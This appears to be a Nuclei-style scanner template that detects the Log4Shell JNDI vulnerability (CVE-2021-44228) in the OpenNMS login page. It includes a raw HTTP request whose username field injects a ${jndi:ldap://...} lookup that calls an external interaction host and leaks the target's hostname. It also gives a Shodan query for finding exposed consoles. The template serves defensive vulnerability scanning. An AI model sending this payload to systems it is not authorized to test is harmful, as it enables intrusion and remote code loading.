id: opennms-log4j-jndi-rce
info:
  name: OpenNMS - JNDI Remote Code Execution (Apache Log4j)
  author: johnk3r
  severity: critical
  description: OpenNMS software is vulnerable to a remote code execution exploit through
    Apache Log4j, allowing attackers to execute arbitrary code loaded from LDAP servers.
  reference:
  - https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
  - https://www.opennms.com/en/blog/2021-12-10-opennms-products-affected-by-apache-log4j-vulnerability-cve-2021-44228/
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: title:"OpenNMS Web Console"
    verified: 'true'
    impact: The opennms-log4j-jndi-rce vulnerability has the potential to allow malicious
      actors to remotely execute arbitrary code on vulnerable systems, presenting
      a significant impact on affected organizations.
    recommendation: I highly recommend immediately updating your OpenNMS software
      to a version that is not susceptible to the JNDI Remote Code Execution vulnerability
      via Apache Log4j to ensure the security of your system.
  tags: jndi,log4j,rce,opennms,cve,cve2021,kev,oast
requests:
- raw:
  - 'POST /opennms/j_spring_security_check HTTP/1.1

    Referer: {{RootURL}}/opennms/login.jsp

    Content-Type: application/x-www-form-urlencoded


    j_username=${jndi:ldap://${hostName}.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
